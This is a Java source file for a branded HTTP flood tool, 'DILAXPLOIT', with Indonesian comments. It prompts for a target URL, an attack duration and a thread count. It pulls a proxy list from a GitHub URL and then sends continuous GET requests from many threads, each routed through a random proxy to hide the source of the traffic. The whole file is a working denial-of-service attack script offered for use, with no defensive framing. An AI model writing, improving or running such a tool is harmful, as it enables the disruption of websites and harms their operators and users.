import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class DDosAttack {
    private static final String USER_AGENT = "Mozilla/5.0";
    private static final Random random = new Random();
    
    public static void main(String[] args) throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        // Tampilan nama DILAXPLOIT
        System.out.println("===============================");
        System.out.println("       DILAXPLOIT ATTACK       ");
        System.out.println("===============================");

        // Meminta input URL target dan durasi serangan
        System.out.print("Masukkan URL target: ");
        String targetUrl = reader.readLine();

        System.out.print("Masukkan durasi serangan (detik): ");
        int duration = Integer.parseInt(reader.readLine());

        System.out.print("Masukkan jumlah thread: ");
        int threads = Integer.parseInt(reader.readLine());

        // URL GitHub atau file lokal tempat proxy disimpan (gunakan salah satu)
        String proxyListUrl = "https://raw.githubusercontent.com/dilaxploit/dilaxploit-v6/main/proxy.txt";
        String[] proxies = getProxiesFromGithub(proxyListUrl);

        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + (duration * 1000);

        for (int i = 0; i < threads; i++) {
            executor.execute(() -> {
                while (System.currentTimeMillis() < endTime) {
                    try {
                        String proxy = proxies[random.nextInt(proxies.length)];
                        sendGetRequest(targetUrl, proxy);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }

        executor.shutdown();
        executor.awaitTermination(duration + 5, TimeUnit.SECONDS);
        System.out.println("Serangan selesai.");
    }

    // Mengambil proxy dari GitHub
    private static String[] getProxiesFromGithub(String url) throws Exception {
        URL githubUrl = new URL(url);
        HttpURLConnection connection = (HttpURLConnection) githubUrl.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine).append("\n");
        }

        in.close();
        connection.disconnect();

        return content.toString().split("\n");
    }

    // Mengirim permintaan GET menggunakan proxy HTTP
    private static void sendGetRequest(String targetUrl, String proxyStr) throws Exception {
        String[] proxyParts = proxyStr.split(":");
        String proxyHost = proxyParts[0];
        int proxyPort = Integer.parseInt(proxyParts[1]);

        // Set up HTTP Proxy
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
        URL url = new URL(targetUrl);
        HttpURLConnection con = (HttpURLConnection) url.openConnection(proxy);
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        // Mengecek respons dari server
        int responseCode = con.getResponseCode();
        System.out.println("Proxy " + proxyHost + ":" + proxyPort + " - Response Code: " + responseCode);
    }
}